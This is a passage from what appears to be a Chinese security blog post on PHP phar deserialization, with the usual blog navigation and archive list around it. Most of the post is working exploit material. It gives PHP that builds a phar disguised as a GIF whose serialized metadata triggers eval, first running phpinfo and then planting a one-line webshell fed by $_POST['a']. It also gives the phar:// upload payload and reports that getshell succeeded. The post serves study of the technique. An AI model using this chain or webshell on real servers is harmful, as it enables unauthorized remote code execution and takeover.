+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "cck";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure>
+<h6 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h6><p>首先是根据file_un.php写一个生成phar的php文件，当然需要绕过gif，所以需要加GIF89a，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用file_exists，使用phar://执行代码</p>
+<h6 id="构造代码"><a href="#构造代码" class="headerlink" title="构造代码"></a>构造代码</h6><p>首先用eval.php生成执行phpinfo的文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "cck";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$object -&gt; output= <span class="string">'phpinfo();'</span>;</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>
+<p>访问eval.php，会在当前目录生成phar.phar，然后修改后缀 gif</p>
+<p><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/phar/7.png" alt></p>
+<p>上传成功，获得上传目录</p>
+<p><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/phar/8.png" alt></p>
+<p>然后利用file_un.php。<br>        payload:filename=phar://upload_file/phar.gif</p>
+<p><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/phar/9.png" alt></p>
+<p>执行phpinfo成功！</p>
+<h6 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h6><p>既然代码能执行成功，又存在命令执行函数，我们就可以实现RCE获得shell!我们尝试上传一句话木马</p>
+<p>，修改后的文件如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "cck";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$object -&gt; output= <span class="string">'eval(@$_POST[\'a\']);'</span>;</span><br><span class="line"><span class="comment">//$object -&gt; output= 'phpinfo();';</span></span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>同样的步骤上传，尝试连接，成功getshell！</p>
+<p><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/phar/10.png" alt></p>
+<h6 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h6><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a> 【利用 phar 拓展 php 反序列化漏洞攻击面】</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://ethancck.github.io">Ethan</a>
+            </p><p>原文链接：<a href="https://ethancck.github.io/2019/04/29/phar反序列化拓展攻击浅析/">https://ethancck.github.io/2019/04/29/phar反序列化拓展攻击浅析/</a>
+            </p><p>发表日期：<a href="https://ethancck.github.io/2019/04/29/phar反序列化拓展攻击浅析/">April 29th 2019, 7:24:21 pm</a>
+            </p><p>更新日期：<a href="https://ethancck.github.io/2019/04/29/phar反序列化拓展攻击浅析/">May 9th 2019, 4:16:54 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2019/05/13/RFI绕过URL包含限制getshell/" title="RFI绕过URL包含限制getshell">
+                    <div class="nextTitle">RFI绕过URL包含限制getshell</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/04/11/xss启示录/" title="xss启示录">
+                    <div class="prevTitle">xss启示录</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+    <div id="comment"></div>
+    <script>
+    new Valine({
+        el: '#comment' ,
+        notify:false, 
+        verify:false, 
+        appId: "FuPdFy9xCtoivKmiix3FHb4d-gzGzoHsz",
+        appKey: "pAQSVceyfizzVqhmmyUQeX2j",
+        placeholder: "一起唠嗑:)",
+        path:window.location.pathname, 
+        avatar:'mm' 
+    });
+    </script>
+
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:7989933065@qq.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/Ethancck" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/weixin.png">
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//twitter.com/Ethan18977083" class="iconfont-archer twitter" target="_blank" title="twitter"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#前言："><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#phar-RCE"><span class="toc-number">2.1.</span> <span class="toc-text">phar RCE</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#延伸"><span class="toc-number">2.2.</span> <span class="toc-text">延伸</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#测试"><span class="toc-number">2.3.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#将phar伪造成其他格式的文件"><span class="toc-number">2.4.</span> <span class="toc-text">将phar伪造成其他格式的文件</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#条件"><span class="toc-number">3.1.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#环境文件"><span class="toc-number">3.2.</span> <span class="toc-text">环境文件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#文件内容"><span class="toc-number">3.3.</span> <span class="toc-text">文件内容</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#实现流程"><span class="toc-number">3.4.</span> <span class="toc-text">实现流程</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#构造代码"><span class="toc-number">3.5.</span> <span class="toc-text">构造代码</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#RCE"><span class="toc-number">3.6.</span> <span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#参考"><span class="toc-number">3.7.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 26
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/内存取证初探/">内存取证艺术</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/charles破解/">charles破解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/Xposed 插件开发基础/">Xposed插件开发</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href="/2019/05/27/iscc线下攻防复现/">iscc2018攻防</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/13</span><a class="archive-post-title" href="/2019/05/13/RFI绕过URL包含限制getshell/">RFI绕过URL包含限制getshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span><a class="archive-post-title" href="/2019/04/29/phar反序列化拓展攻击浅析/">phar反序列化拓展攻击浅析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/xss启示录/">xss启示录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href="/2019/04/09/curl的一些tircks/">curl的一些tircks</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span><a class="archive-post-title" href="/2019/04/06/反序列化的一些tricks/">反序列化的一些tricks</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span><a class="archive-post-title" href="/2019/04/06/PHP之反序列化分析/">PHP之反序列化分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/AWD线下准备指南/">AWD线下备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/30</span><a class="archive-post-title" href="/2019/03/30/FUZZ测试某狗WAF绕过/">FUZZ测试某狗WAF绕过</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/29</span><a class="archive-post-title" href="/2019/03/29/WFUZZ使用教程/">WFUZZ使用教程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/28</span><a class="archive-post-title" href="/2019/03/28/大话FUZZ测试/">大话FUZZ测试</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/13</span><a class="archive-post-title" href="/2019/03/13/php代码审计之函数漏洞审计(下)/">php代码审计之函数漏洞审计(下)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/13</span><a class="archive-post-title" href="/2019/03/13/php代码审计之函数漏洞审计(上)/">php代码审计之函数漏洞审计(上)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/07</span><a class="archive-post-title" href="/2019/03/07/CTF命令执行及绕过技巧/">CTF命令执行及绕过技巧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/05</span><a class="archive-post-title" href="/2019/03/05/Phpstorm+Xdebug动态调试配置/">Phpstorm+Xdebug动态调试配置</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(二)/">SQL注入回顾篇(2)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(四)/">SQL注入回顾篇(4)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(三)/">SQL注入回顾篇(3)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(一)/">SQL注入回顾篇(1)</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href="/2018/10/04/python沙盒逃逸/">python 沙盒逃逸</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/2018/09/02/萌萌哒报名系统/">CTF&&lctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/29</span><a class="archive-post-title" href="/2018/08/29/安卓架构分析/">安卓架构分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/28</span><a class="archive-post-title" href="/2018/08/28/时光/">时光说</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="fuzz 脚本"><span class="iconfont-archer">&#xe606;</span>fuzz 脚本</span>
+    
+        <span class="sidebar-tag-name" data-tags="php代码审计"><span class="iconfont-archer">&#xe606;</span>php代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="系统"><span class="iconfont-archer">&#xe606;</span>系统</span>
+    
+        <span class="sidebar-tag-name" data-tags="时光"><span class="iconfont-archer">&#xe606;</span>时光</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具"><span class="iconfont-archer">&#xe606;</span>工具</span>
+    
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="curl"><span class="iconfont-archer">&#xe606;</span>curl</span>
+    
+        <span class="sidebar-tag-name" data-tags="phar反序列化"><span class="iconfont-archer">&#xe606;</span>phar反序列化</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="sql注入，攻防"><span class="iconfont-archer">&#xe606;</span>sql注入，攻防</span>
+    
+        <span class="sidebar-tag-name" data-tags="fuzz"><span class="iconfont-archer">&#xe606;</span>fuzz</span>
+    
+        <span class="sidebar-tag-name" data-tags="命令注入，攻防"><span class="iconfont-archer">&#xe606;</span>命令注入，攻防</span>
+    
+        <span class="sidebar-tag-name" data-tags="fuzz 工具"><span class="iconfont-archer">&#xe606;</span>fuzz 工具</span>
+    
+        <span class="sidebar-tag-name" data-tags="逆向破解"><span class="iconfont-archer">&#xe606;</span>逆向破解</span>
+    
+        <span class="sidebar-tag-name" data-tags="安卓架构"><span class="iconfont-archer">&#xe606;</span>安卓架构</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="web安全"><span class="iconfont-archer">&#xe60a;</span>web安全</span>
+    
+        <span class="sidebar-category-name" data-categories="年轻时"><span class="iconfont-archer">&#xe60a;</span>年轻时</span>
+    
+        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
+    
+        <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
+    
+        <span class="sidebar-category-name" data-categories="移动安全"><span class="iconfont-archer">&#xe60a;</span>移动安全</span>
+    
+        <span class="sidebar-category-name" data-categories="系统安全"><span class="iconfont-archer">&#xe60a;</span>系统安全</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Ethan"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
